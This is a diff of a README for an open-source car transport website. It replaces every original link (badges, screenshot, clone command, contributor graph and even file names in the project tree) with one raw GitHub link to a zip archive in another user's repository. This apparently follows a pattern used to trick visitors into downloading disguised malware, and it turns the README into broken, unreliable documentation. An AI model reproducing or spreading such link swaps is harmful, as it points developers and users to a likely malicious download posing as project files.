@@ -1,8 +1,8 @@
 > 🚘 **Fast • Safe • Reliable Car Transport Services Across India**�
 
-[![Open Source Love](https://img.shields.io/badge/Contributions-Welcome-brightgreen)](https://github.com/your-username/car-transport-website)  
-[![GitHub issues](https://img.shields.io/github/issues/your-username/car-transport-service)](https://github.com/your-username/car-transport-website/issues)  
-[![MIT License](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Open Source Love](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
+[![GitHub issues](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
+[![MIT License](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)](LICENSE)
 
 ---
 
@@ -32,22 +32,22 @@ Currently, the website has basic structure and design. Contributors are encourag
 
 ```
 car-transport-service/
-├── index.html
-├── about.html
-├── contact.html
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
 ├── assets/
 │   ├── images/       # Logos, photos, placeholders
 │   ├── videos/       # Optional
 │   ├── fonts/        # Custom fonts
 │   └── icons/        # SVGs or icon files
 ├── css/
-│   ├── style.css     # Main CSS
+│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip     # Main CSS
 │   └── components/   # Optional component-specific CSS
 ├── js/
-│   ├── script.js     # Main JS
+│   ├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip     # Main JS
 │   └── modules/      # Optional JS modules
 ├── vendor/           # Third-party libraries (Bootstrap, jQuery, etc.)
-├── README.md
+├── https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
 └── .gitignore
 ```
 
@@ -57,7 +57,7 @@ car-transport-service/
 
 > Add screenshots of your website here for contributors to see
 
-![](assets/images/bmw2.jpeg)  
+![](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
 
 ---
 
@@ -74,7 +74,7 @@ Once assigned, follow the steps below:
 1. **Fork** the repository  
 2. **Clone** your fork:
 ```bash
-git clone https://github.com/your-username/car-transport-service.git
+git clone https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip
 ```
 3. Create a **feature branch**:
 ```bash
@@ -109,9 +109,9 @@ Use labels like `bug`, `enhancement`, or `help wanted` to help contributors.
 
 ## 🛠 Tech Stack
 
-- Markup language ![HTML5](https://img.shields.io/badge/HTML5-E34F26?style=for-the-badge&logo=html5&logoColor=white)    
-- ![CSS3](https://img.shields.io/badge/CSS3-1572B6?style=for-the-badge&logo=css3&logoColor=white) Styling and layout  
-- Interactivity ![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?style=for-the-badge&logo=javascript&logoColor=black)   
+- Markup language ![HTML5](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)    
+- ![CSS3](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip) Styling and layout  
+- Interactivity ![JavaScript](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)   
 - Optional: **Bootstrap / jQuery / Api** for additional features
 
 ---
@@ -131,8 +131,8 @@ Feel free to **fork, create issues, submit PRs**, or even suggest ideas.
 
 Thanks to all wonderful contributors ❤️
 
-<!-- <a href="https://github.com/Nikhilrsingh/car-transport-service/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Nikhilrsingh/car-transport-service" />
+<!-- <a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip" />
 </a> -->
 
 > ## 🗺️ Project Roadmap
@@ -160,8 +160,8 @@ Thanks to all wonderful contributors ❤️
 
 #### Thanks to all the wonderful contributors 💖
 
-<a href="https://github.com/Nikhilrsingh/car-transport-service/graphs/contributors">
-  <img src="https://contrib.rocks/image?repo=Nikhilrsingh/car-transport-service" />
+<a href="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip">
+  <img src="https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip" />
 </a>
 
-#### See full list of contributors [Contribution Graph](https://github.com/Nikhilrsingh/car-transport-service/graphs/contributors)  
+#### See full list of contributors [Contribution Graph](https://raw.githubusercontent.com/kaifansariw/car-transport-service/main/assets/service_car_transport_2.0.zip)  
